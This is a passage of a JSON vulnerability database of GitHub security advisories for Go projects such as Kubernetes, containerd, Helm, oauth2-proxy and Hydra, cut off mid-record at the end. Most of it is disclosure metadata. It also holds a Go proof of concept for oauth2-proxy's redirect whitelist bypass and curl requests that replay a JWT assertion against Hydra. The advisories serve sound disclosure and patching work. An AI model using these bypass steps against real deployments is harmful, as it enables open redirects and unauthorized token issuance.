"affected": [{"package": {"ecosystem": "Go", "name": "github.com/hashicorp/vault-plugin-secrets-gcp"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "0.6.2"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2020-12757"}, {"type": "WEB", "url": "https://github.com/hashicorp/vault-plugin-secrets-gcp/pull/85"}, {"type": "WEB", "url": "https://github.com/hashicorp/vault-plugin-secrets-gcp/commit/e43d20870c50f7428dead1411debcec075b35fb4"}, {"type": "WEB", "url": "https://github.com/hashicorp/vault/blob/master/CHANGELOG.md"}, {"type": "WEB", "url": "https://github.com/hashicorp/vault/blob/master/CHANGELOG.md#142-may-21st-2020"}, {"type": "WEB", "url": "https://www.hashicorp.com/blog/category/vault/"}], "database_specific": {"cwe_ids": ["CWE-20"], "severity": "CRITICAL", "github_reviewed": true, "github_reviewed_at": "2021-05-13T14:47:09Z", "nvd_published_at": null}}, {"schema_version": "1.4.0", "id": "GHSA-3x58-xr87-2fcj", "modified": "2021-05-18T21:05:51Z", "published": "2021-05-18T21:07:37Z", "aliases": ["CVE-2021-29272"], "summary": "Cross-site scripting in bluemonday", "details": "bluemonday before 1.0.5 allows XSS because certain Go lowercasing converts an uppercase Cyrillic character, defeating a protection mechanism against the \"script\" string.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/microcosm-cc/bluemonday"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "1.0.5"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2021-29272"}, {"type": "WEB", "url": "https://github.com/microcosm-cc/bluemonday/issues/111"}, {"type": "WEB", "url": "https://github.com/microcosm-cc/bluemonday/commit/524f142fe46e945b7dcd291d7805c4b7dcf75bee"}, {"type": "WEB", "url": "https://github.com/microcosm-cc/bluemonday/releases/tag/v1.0.5"}, {"type": "WEB", "url": "https://pkg.go.dev/vuln/GO-2022-0762"}, {"type": "WEB", "url": "https://vuln.ryotak.me/advisories/4"}, {"type": "WEB", "url": "https://vuln.ryotak.me/advisories/4.txt"}], "database_specific": {"cwe_ids": ["CWE-79"], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2021-05-18T21:05:51Z", "nvd_published_at": null}}, {"schema_version": "1.4.0", "id": "GHSA-h746-rm5q-8mgq", "modified": "2023-10-02T12:04:37Z", "published": "2021-05-21T14:31:11Z", "aliases": ["CVE-2021-27098"], "summary": "Legacy Node API Allows Impersonation in github.com/spiffe/spire/pkg/server/endpoints/node", "details": "#### Summary\nIn SPIRE 0.8.1 through 0.8.4 and before versions 0.9.4, 0.10.2, 0.11.3 and 0.12.1, specially crafted requests to the FetchX509SVID RPC of SPIRE Server\u2019s Legacy Node API (github.com/spiffe/spire/pkg/server/endpoints/node) can result in the possible issuance of an X.509 certificate with a URI SAN for a SPIFFE ID that the agent is not authorized to distribute. Proper controls are in place to require that the caller presents a valid agent certificate that is already authorized to issue at least one SPIFFE ID, and the requested SPIFFE ID belongs to the same trust domain, prior to being able to trigger this vulnerability. This issue has been fixed in SPIRE versions 0.8.5, 0.9.4, 0.10.2, 0.11.3 and 0.12.1.\n\n#### What are the changes introduced by the patched versions?\nThe changes introduced to address this issue are related to enforcing that the FetchX509SVID RPC of SPIRE Server\u2019s Legacy Node API only issues X.509 certificates with SPIFFE IDs that the agent is authorized to distribute.\n\nThe patched version also includes a back-ported change that improves the handling of file descriptors related to workload attestation in SPIRE Agent.\n\nThere are no changes in the expected behavior of SPIRE.\n\n#### Should I upgrade SPIRE?\nAll SPIRE users running affected versions are advised to upgrade to the corresponding patched version.\n\n#### Workarounds\nNo workarounds have been identified for this vulnerability.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/spiffe/spire"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0.8.1"}, {"fixed": "0.8.5"}]}]}, {"package": {"ecosystem": "Go", "name": "github.com/spiffe/spire"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0.9.0"}, {"fixed": "0.9.4"}]}]}, {"package": {"ecosystem": "Go", "name": "github.com/spiffe/spire"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0.10.0"}, {"fixed": "0.10.2"}]}]}, {"package": {"ecosystem": "Go", "name": "github.com/spiffe/spire"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0.11.0"}, {"fixed": "0.11.3"}]}]}, {"package": {"ecosystem": "Go", "name": "github.com/spiffe/spire"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0.12.0"}, {"fixed": "0.12.1"}]}]}], "references": [{"type": "WEB", "url": "https://github.com/spiffe/spire/security/advisories/GHSA-h746-rm5q-8mgq"}, {"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2021-27098"}, {"type": "WEB", "url": "https://github.com/spiffe/spire/commit/3c5115b57afc20a0a2c2b1b9dd60dd1fd9082e13"}, {"type": "WEB", "url": "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-27098"}], "database_specific": {"cwe_ids": ["CWE-284", "CWE-295"], "severity": "HIGH", "github_reviewed": true, "github_reviewed_at": "2021-05-21T14:28:38Z", "nvd_published_at": null}}, {"schema_version": "1.4.0", "id": "GHSA-g42g-737j-qx6j", "modified": "2022-03-22T18:43:41Z", "published": "2021-05-28T19:49:59Z", "aliases": ["CVE-2021-25735"], "summary": "Access Restriction Bypass in kube-apiserver", "details": "A vulnerability in Kubernetes `kube-apiserver` could allow node updates to bypass a _Validating Admission Webhook_ and allow unauthorized node updates. The information that is provided to the admission controller could contain old configurations that overwrite values used for validation. Since the overwriting takes place before the validation, this could lead the admission controller to accept requests that should be blocked. The vulnerability can be exploited when an update action on node resources is performed and an admission controller is in place and configured to validate the action.\n\nUsers are only affected by this vulnerability if they are running a _Validating Admission Webhook_ for Nodes that denies admission based partially on the old state of the Node object. It only impacts validating admission plugins that rely on old values in certain fields and does not impact calls from kubelets that go through the built-in NodeRestriction admission plugin.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:N/I:H/A:H"}], "affected": [{"package": {"ecosystem": "Go", "name": "k8s.io/kubernetes"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "1.20.0"}, {"fixed": "1.20.6"}]}], "database_specific": {"last_known_affected_version_range": "<= 1.20.5"}}, {"package": {"ecosystem": "Go", "name": "k8s.io/kubernetes"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "1.19.0"}, {"fixed": "1.19.10"}]}], "database_specific": {"last_known_affected_version_range": "<= 1.19.9"}}, {"package": {"ecosystem": "Go", "name": "k8s.io/kubernetes"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "1.18.18"}]}], "database_specific": {"last_known_affected_version_range": "<= 1.18.17"}}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2021-25735"}, {"type": "WEB", "url": "https://github.com/kubernetes/kubernetes/issues/100096"}, {"type": "WEB", "url": "https://github.com/kubernetes/kubernetes/pull/99946"}, {"type": "WEB", "url": "https://github.com/kubernetes/kubernetes/commit/00e81db174ef7aca497be5f42d87e46d14df2a90"}, {"type": "WEB", "url": "https://bugzilla.redhat.com/show_bug.cgi?id=1937562"}, {"type": "PACKAGE", "url": "https://github.com/kubernetes/kubernetes"}, {"type": "WEB", "url": "https://groups.google.com/g/kubernetes-security-announce/c/FKAGqT4jx9Y"}, {"type": "WEB", "url": "https://pkg.go.dev/k8s.io/kubernetes@v1.23.5/cmd/kube-apiserver"}, {"type": "WEB", "url": "https://sysdig.com/blog/cve-2021-25735-kubernetes-admission-bypass/"}], "database_specific": {"cwe_ids": ["CWE-284", "CWE-372", "CWE-863"], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2022-03-22T18:25:38Z", "nvd_published_at": "2021-09-06T12:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-grh6-q6m2-rh72", "modified": "2023-09-18T19:30:49Z", "published": "2021-05-18T21:07:49Z", "aliases": ["CVE-2021-20199"], "summary": "Podman Origin Validation Error", "details": "Rootless containers run with Podman, receive all traffic with a source IP address of 127.0.0.1 (including from remote hosts). This impacts containerized applications that trust localhost (127.0.01) connections by default and do not require authentication. This issue affects Podman versions from 1.8.0 to 3.0.0.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:H/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/containers/podman/v3"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "3.0.0"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2021-20199"}, {"type": "WEB", "url": "https://github.com/containers/podman/issues/5138"}, {"type": "WEB", "url": "https://github.com/containers/podman/pull/9052"}, {"type": "WEB", "url": "https://github.com/containers/podman/pull/9225"}, {"type": "WEB", "url": "https://github.com/rootless-containers/rootlesskit/pull/206"}, {"type": "WEB", "url": "https://bugzilla.redhat.com/show_bug.cgi?id=1919050"}, {"type": "WEB", "url": "https://github.com/containers/podman/releases/tag/v3.0.0-rc3"}], "database_specific": {"cwe_ids": ["CWE-200", "CWE-346"], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2021-05-18T21:02:35Z", "nvd_published_at": null}}, {"schema_version": "1.4.0", "id": "GHSA-rffr-c932-cpxv", "modified": "2021-05-04T22:01:58Z", "published": "2021-05-18T18:27:50Z", "aliases": ["CVE-2019-19025"], "summary": "Cross-site Request Forgery (CSRF) in Cloud Native Computing Foundation Harbor", "details": "Cloud Native Computing Foundation Harbor prior to 1.8.6 and 1.9.3 allows CSRF in the VMware Harbor Container Registry for the Pivotal Platform.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:H/I:L/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/goharbor/harbor"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "1.7.0"}, {"fixed": "1.8.6"}]}]}, {"package": {"ecosystem": "Go", "name": "github.com/goharbor/harbor"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "1.9.0"}, {"fixed": "1.9.3"}]}]}], "references": [{"type": "WEB", "url": "https://github.com/goharbor/harbor/security/advisories/GHSA-gcqm-v682-ccw6"}, {"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2019-19025"}, {"type": "WEB", "url": "https://github.com/goharbor/harbor/security/advisories"}, {"type": "WEB", "url": "https://tanzu.vmware.com/security/cve-2019-19025"}], "database_specific": {"cwe_ids": ["CWE-352"], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2021-05-04T22:01:58Z", "nvd_published_at": "2020-03-20T03:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-h43v-26r7-7j4c", "modified": "2023-09-29T15:55:50Z", "published": "2021-05-18T18:20:19Z", "aliases": ["CVE-2020-7218"], "summary": "Allocation of Resources Without Limits or Throttling in HashiCorp Nomad", "details": "HashiCorp Nomad and Nomad Enterprise before 0.10.3 allow unbounded resource usage.\n\n### Specific Go Packages Affected\ngithub.com/hashicorp/nomad/command/agent", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/hashicorp/nomad"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "0.10.3"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2020-7218"}, {"type": "WEB", "url": "https://github.com/hashicorp/nomad/issues/7002"}, {"type": "WEB", "url": "https://github.com/hashicorp/nomad/pull/7022"}, {"type": "PACKAGE", "url": "https://github.com/hashicorp/nomad"}, {"type": "WEB", "url": "https://www.hashicorp.com/blog/category/nomad/"}], "database_specific": {"cwe_ids": ["CWE-400", "CWE-770"], "severity": "HIGH", "github_reviewed": true, "github_reviewed_at": "2021-05-13T15:03:56Z", "nvd_published_at": "2020-01-31T13:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-jm56-5h66-w453", "modified": "2023-10-02T13:35:50Z", "published": "2021-05-24T16:57:06Z", "aliases": ["CVE-2020-15185"], "summary": "Repository index file allows for duplicates of the same chart entry in helm", "details": "### Impact\n\nDuring a security audit of Helm's code base, security researchers at Trail of Bits identified a bug in which the a Helm repository can contain duplicates of the same chart, with the last one always used. If a repository is compromised, this lowers the level of access that an attacker needs to inject a bad chart into a repository.\n\nTo perform this attack, an attacker must have write access to the index file (which can occur during a MITM attack on a non-SSL connection).\n\n### Specific Go Packages Affected\nhelm.sh/helm/v3/pkg/repo\n\n### Patches\n\nThis issue has been patched in Helm 3.3.2 and 2.16.11\n\n### Workarounds\n\n- do not install charts from repositories you do not trust\n- fetch charts using a secure channel of communication (such as TLS)\n- use `helm pull` to fetch the chart, then review the chart\u2019s content (either manually, or with `helm verify` if it has been signed) to ensure it has not been tampered with\n- manually review the index file in the Helm repository cache before installing software.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:H/PR:H/UI:N/S:U/C:N/I:L/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "helm.sh/helm/v3"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "3.0.0"}, {"fixed": "3.3.2"}]}]}, {"package": {"ecosystem": "Go", "name": "helm.sh/helm"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "2.16.11"}]}]}], "references": [{"type": "WEB", "url": "https://github.com/helm/helm/security/advisories/GHSA-jm56-5h66-w453"}, {"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2020-15185"}, {"type": "WEB", "url": "https://github.com/helm/helm/commit/055dd41cbe53ce131ab0357524a7f6729e6e40dc"}, {"type": "WEB", "url": "https://github.com/helm/helm/commit/6aab63765f99050b115f0aec3d6350c85e8da946"}], "database_specific": {"cwe_ids": ["CWE-20", "CWE-694", "CWE-74"], "severity": "LOW", "github_reviewed": true, "github_reviewed_at": "2021-05-24T16:47:58Z", "nvd_published_at": "2020-09-17T22:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-4mf2-f3wh-gvf2", "modified": "2021-05-21T21:37:23Z", "published": "2021-05-25T18:42:20Z", "aliases": ["CVE-2021-21291"], "summary": "Subdomain checking of whitelisted domains could allow unintended redirects in oauth2-proxy", "details": "### Impact\n_What kind of vulnerability is it? Who is impacted?_\nFor users that use the whitelist domain feature, a domain that ended in a similar way to the intended domain could have been allowed as a redirect.\n\nFor example, if a whitelist domain was configured for `.example.com`, the intention is that subdomains of `example.com` are allowed.\nInstead, `example.com` and `badexample.com` could also match.\n\n### Patches\n_Has the problem been patched? What versions should users upgrade to?_\nThis is fixed in version 7.0.0 onwards.\n\n### Workarounds\n_Is there a way for users to fix or remediate the vulnerability without upgrading?_\nDisable the whitelist domain feature and run separate OAuth2 Proxy instances for each subdomain.\n\n# Original Issue Posted by @semoac:\n\nWhitelist Domain feature is not working as expected because is not matching a dot to ensure the redirect is a subdomain.\n\n## Expected Behavior\n\nIf whitelist domain is set to `.example.com` , then `hack.alienexample.com`  should be rejected as a valid redirect.\n\n## Current Behavior\n\nThe code is removing the `dot`  from `.example.com`  and  only checking if the redirect string end with `example.com`\n\n## Possible Solution\nHere\nhttps://github.com/oauth2-proxy/oauth2-proxy/blob/c377466411f2aee180a732187edb638f2f7e57fb/oauthproxy.go#L661\n\nInclude the dot when checking the string:\n```\nstrings.HasSuffix(redirectHostname, \".\" + domainHostname)\n```\n\n## Steps to Reproduce (for bugs)\n\n```\npackage main\n\nimport (\n\t\"fmt\"\n\t\"strings\"\n)\n\nfunc validOptionalPort(port string) bool {\n\tif port == \"\" || port == \":*\" {\n\t\treturn true\n\t}\n\tif port[0] != ':' {\n\t\treturn false\n\t}\n\tfor _, b := range port[1:] {\n\t\tif b < '0' || b > '9' {\n\t\t\treturn false\n\t\t}\n\t}\n\treturn true\n}\n\nfunc splitHostPort(hostport string) (host, port string) {\n\thost = hostport\n\n\tcolon := strings.LastIndexByte(host, ':')\n\tif colon != -1 && validOptionalPort(host[colon:]) {\n\t\thost, port = host[:colon], host[colon+1:]\n\t}\n\n\tif strings.HasPrefix(host, \"[\") && strings.HasSuffix(host, \"]\") {\n\t\thost = host[1 : len(host)-1]\n\t}\n\n\treturn\n}\n\nfunc main() {\n\tdomain := \".example.com\"\n\tdomainHostname, _ := splitHostPort(strings.TrimLeft(domain, \".\"))\n\tredirectHostname := \"https://hack.alienexample.com\"\n\tif (strings.HasPrefix(domain, \".\") && strings.HasSuffix(redirectHostname, domainHostname)) { fmt.Println(\"This should not have happen.\")}\n}\n\n```\n\nUsers of `github.com/oauth2-proxy/oauth2-proxy` are advised to update to `github.com/oauth2-proxy/oauth2-proxy/v7`", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:L/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/oauth2-proxy/oauth2-proxy/v7"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "7.0.0"}]}]}, {"package": {"ecosystem": "Go", "name": "github.com/oauth2-proxy/oauth2-proxy"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"last_affected": "3.2.0"}]}]}], "references": [{"type": "WEB", "url": "https://github.com/oauth2-proxy/oauth2-proxy/security/advisories/GHSA-4mf2-f3wh-gvf2"}, {"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2021-21291"}, {"type": "WEB", "url": "https://github.com/oauth2-proxy/oauth2-proxy/commit/780ae4f3c99b579cb2ea9845121caebb6192f725"}, {"type": "WEB", "url": "https://github.com/oauth2-proxy/oauth2-proxy/releases/tag/v7.0.0"}, {"type": "WEB", "url": "https://pkg.go.dev/github.com/oauth2-proxy/oauth2-proxy/v7"}], "database_specific": {"cwe_ids": ["CWE-601"], "severity": "LOW", "github_reviewed": true, "github_reviewed_at": "2021-05-21T21:37:23Z", "nvd_published_at": null}}, {"schema_version": "1.4.0", "id": "GHSA-hmm9-r2m2-qg9w", "modified": "2023-08-30T18:06:49Z", "published": "2021-05-21T16:22:10Z", "aliases": [], "summary": "Nil dereference in NATS JWT causing DoS of nats-server", "details": "(This advisory is canonically <https://advisories.nats.io/CVE/CVE-2020-26521.txt>)\n\n## Problem Description\n\nThe NATS account system has an Operator trusted by the servers, which signs Accounts, and each Account can then create and sign Users within their account.  The Operator should be able to safely issue Accounts to other entities which it does not fully trust.\n\nA malicious Account could create and sign a User JWT with a state not created by the normal tooling, such that decoding by the NATS JWT library (written in Go) would attempt a nil dereference, aborting execution.\n\nThe NATS Server is known to be impacted by this.\n\n\n## Affected versions\n\n#### JWT library\n\n * all versions prior to 1.1.0\n\n#### NATS Server\n\n * Version 2 prior to 2.1.9\n\n\n## Impact\n\n#### JWT library\n\n * Programs would nil dereference and panic, aborting execution by default.\n\n#### NATS server\n\n * Denial of Service caused by process termination\n\n\n## Workaround\n\nIf your NATS servers do not trust any accounts which are managed by untrusted entities, then malformed User credentials are unlikely to be encountered.\n\n\n## Solution\n\nUpgrade the JWT dependency in any application using it.\n\nUpgrade the NATS server if using NATS Accounts.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/nats-io/nats-server/v2"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "2.1.9"}]}]}, {"package": {"ecosystem": "Go", "name": "github.com/nats-io/jwt"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "1.1.0"}]}]}], "references": [{"type": "WEB", "url": "https://github.com/nats-io/nats-server/security/advisories/GHSA-hmm9-r2m2-qg9w"}, {"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2020-26521"}, {"type": "WEB", "url": "https://github.com/nats-io/jwt/pull/107"}, {"type": "WEB", "url": "https://advisories.nats.io/CVE/CVE-2020-26521.txt"}, {"type": "WEB", "url": "https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/VT67XCLIIBYRT762SVFBYFFTQFVSM3SI/"}, {"type": "WEB", "url": "https://www.openwall.com/lists/oss-security/2020/11/02/2"}], "database_specific": {"cwe_ids": ["CWE-476"], "severity": "HIGH", "github_reviewed": true, "github_reviewed_at": "2021-05-20T21:18:45Z", "nvd_published_at": null}}, {"schema_version": "1.4.0", "id": "GHSA-gmq2-39ff-f5qg", "modified": "2021-05-21T14:40:36Z", "published": "2021-05-21T16:25:48Z", "aliases": [], "summary": "A failed upgrade may lead to hung goroutines", "details": "### Impact\nProcesses using tableflip may encounter hung goroutines in the parent process, after a failed upgrade.\n\nThe Go runtime has annoying behaviour around setting and clearing\nO_NONBLOCK: exec.Cmd.Start() ends up calling os.File.Fd() for any\nfile in exec.Cmd.ExtraFiles. os.File.Fd() disables both the use\nof the runtime poller for the file and clears O_NONBLOCK from\nthe underlying open file descriptor.\n\nThis can lead to goroutines hanging in a parent process, after at least\none failed upgrade. The bug manifests in goroutines which rely on\neither a deadline or interruption via Close() to be unblocked being stuck\nin read or accept like syscalls. As far as I can tell we've not experienced\nthis problem in production, so it's most likely quite rare.\n\n### Patches\nThe problem has been fixed in v1.2.2.\n\n### Workarounds\nNone.\n\n### References\n* https://github.com/cloudflare/tableflip/commit/cae714b289e199db5da5f08af861ea65be6232c0", "severity": [], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/cloudflare/tableflip"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "1.2.2"}]}], "database_specific": {"last_known_affected_version_range": "< 1.2.1"}}], "references": [{"type": "WEB", "url": "https://github.com/cloudflare/tableflip/security/advisories/GHSA-gmq2-39ff-f5qg"}, {"type": "WEB", "url": "https://github.com/cloudflare/tableflip/commit/cae714b289e199db5da5f08af861ea65be6232c0"}], "database_specific": {"cwe_ids": [], "severity": "LOW", "github_reviewed": true, "github_reviewed_at": "2021-05-21T14:40:36Z", "nvd_published_at": null}}, {"schema_version": "1.4.0", "id": "GHSA-75qf-wgfj-v652", "modified": "2023-10-18T22:18:14Z", "published": "2021-05-18T18:28:03Z", "aliases": ["CVE-2020-7669"], "summary": "github.com/u-root/u-root/pkg/tarutil Arbitrary File Write via Archive Extraction (Zip Slip)", "details": "This affects all versions up to and including version 0.7.0 of package github.com/u-root/u-root/pkg/tarutil. It is vulnerable to both leading and non-leading relative path traversal attacks in tar file extraction.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/u-root/u-root"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "0.9.0"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2020-7669"}, {"type": "WEB", "url": "https://github.com/u-root/u-root/issues/2449"}, {"type": "WEB", "url": "https://github.com/u-root/u-root/pull/1817"}, {"type": "WEB", "url": "https://github.com/u-root/u-root/pull/2344"}, {"type": "WEB", "url": "https://snyk.io/vuln/SNYK-GOLANG-GITHUBCOMUROOTUROOTPKGTARUTIL-570428"}], "database_specific": {"cwe_ids": ["CWE-22"], "severity": "HIGH", "github_reviewed": true, "github_reviewed_at": "2021-05-05T19:02:17Z", "nvd_published_at": null}}, {"schema_version": "1.4.0", "id": "GHSA-36xw-fx78-c5r4", "modified": "2023-10-02T15:37:35Z", "published": "2021-05-24T17:00:22Z", "aliases": ["CVE-2020-15257"], "summary": "containerd-shim API Exposed to Host Network Containers", "details": "## Impact\n\nAccess controls for the shim\u2019s API socket verified that the connecting process had an effective UID of 0, but did not otherwise restrict access to the abstract Unix domain socket. This would allow malicious containers running in the same network namespace as the shim, with an effective UID of 0 but otherwise reduced privileges, to cause new processes to be run with elevated privileges.\n\n### Specific Go Packages Affected\ngithub.com/containerd/containerd/cmd\n\n## Patches\n\nThis vulnerability has been fixed in containerd 1.3.9 and 1.4.3.  Users should update to these versions as soon as they are released.  It should be noted that containers started with an old version of containerd-shim should be stopped and restarted, as running containers will continue to be vulnerable even after an upgrade.\n\n## Workarounds\n\nIf you are not providing the ability for untrusted users to start containers in the same network namespace as the shim (typically the \"host\" network namespace, for example with `docker run --net=host` or `hostNetwork: true` in a Kubernetes pod) and run with an effective UID of 0, you are not vulnerable to this issue.\n\nIf you are running containers with a vulnerable configuration, you can deny access to all abstract sockets with AppArmor by adding a line similar to `deny unix addr=@**,` to your policy.\n\nIt is best practice to run containers with a reduced set of privileges, with a non-zero UID, and with isolated namespaces.  The containerd maintainers strongly advise against sharing namespaces with the host. Reducing the set of isolation mechanisms used for a container necessarily increases that container's privilege, regardless of what container runtime is used for running that container.\n\n## Credits\n\nThe containerd maintainers would like to thank Jeff Dileo of NCC Group for responsibly disclosing this issue in accordance with the [containerd security policy](https://github.com/containerd/project/blob/master/SECURITY.md) and for reviewing the patch.\n\n## For more information\n\nIf you have any questions or comments about this advisory:\n\n\n* [Open an issue](https://github.com/containerd/containerd/issues/new/choose)\n* Email us at security@containerd.io if you think you\u2019ve found a security bug.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:C/C:L/I:L/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/containerd/containerd"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "1.3.9"}]}]}, {"package": {"ecosystem": "Go", "name": "github.com/containerd/containerd"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "1.4.0"}, {"fixed": "1.4.3"}]}]}], "references": [{"type": "WEB", "url": "https://github.com/containerd/containerd/security/advisories/GHSA-36xw-fx78-c5r4"}, {"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2020-15257"}, {"type": "WEB", "url": "https://github.com/containerd/containerd/commit/4a4bb851f5da563ff6e68a83dc837c7699c469ad"}, {"type": "WEB", "url": "https://github.com/containerd/containerd/releases/tag/v1.4.3"}, {"type": "WEB", "url": "https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/LNKXLOLZWO5FMAPX63ZL7JNKTNNT5NQD/"}, {"type": "WEB", "url": "https://research.nccgroup.com/2020/12/10/abstract-shimmer-cve-2020-15257-host-networking-is-root-equivalent-again/"}, {"type": "WEB", "url": "https://security.gentoo.org/glsa/202105-33"}, {"type": "WEB", "url": "https://www.debian.org/security/2021/dsa-4865"}], "database_specific": {"cwe_ids": ["CWE-669"], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2021-05-21T22:13:21Z", "nvd_published_at": "2020-12-01T03:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-3p3g-vpw6-4w66", "modified": "2023-09-29T17:16:04Z", "published": "2021-05-27T18:43:22Z", "aliases": ["CVE-2020-5300"], "summary": "Authentication Bypass in hydra", "details": "### Impact\n\nWhen using client authentication method \"private_key_jwt\" [1], OpenId specification says the following about assertion `jti`:\n\n> A unique identifier for the token, which can be used to prevent reuse of the token. These tokens MUST only be used once, unless conditions for reuse were negotiated between the parties\n\nHydra does not seem to check the uniqueness of this `jti` value. Here is me sending the same token request twice, hence with the same `jti` assertion, and getting two access tokens:\n\n```\n$ curl --insecure --location --request POST 'https://localhost/_/oauth2/token' \\\n   --header 'Content-Type: application/x-www-form-urlencoded' \\\n   --data-urlencode 'grant_type=client_credentials' \\\n   --data-urlencode 'client_id=c001d00d-5ecc-beef-ca4e-b00b1e54a111' \\\n   --data-urlencode 'scope=application openid' \\\n   --data-urlencode 'client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer' \\\n   --data-urlencode 'client_assertion=eyJhb [...] jTw'\n{\"access_token\":\"zeG0NoqOtlACl8q5J6A-TIsNegQRRUzqLZaYrQtoBZQ.VR6iUcJQYp3u_j7pwvL7YtPqGhtyQe5OhnBE2KCp5pM\",\"expires_in\":3599,\"scope\":\"application openid\",\"token_type\":\"bearer\"}\u23ce            ~$ curl --insecure --location --request POST 'https://localhost/_/oauth2/token' \\\n   --header 'Content-Type: application/x-www-form-urlencoded' \\\n   --data-urlencode 'grant_type=client_credentials' \\\n   --data-urlencode 'client_id=c001d00d-5ecc-beef-ca4e-b00b1e54a111' \\\n   --data-urlencode 'scope=application openid' \\\n   --data-urlencode 'client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer' \\\n   --data-urlencode 'client_assertion=eyJhb [...] jTw'\n{\"access_token\":\"wOYtgCLxLXlELORrwZlmeiqqMQ4kRzV-STU2_Sollas.mwlQGCZWXN7G2IoegUe1P0Vw5iGoKrkOzOaplhMSjm4\",\"expires_in\":3599,\"scope\":\"application openid\",\"token_type\":\"bearer\"}\n```\n\n### Severity\n\nWe rate the severity as medium because the following reasons make it hard to replay tokens without the patch:\u0010\n\n- TLS protects against MITM 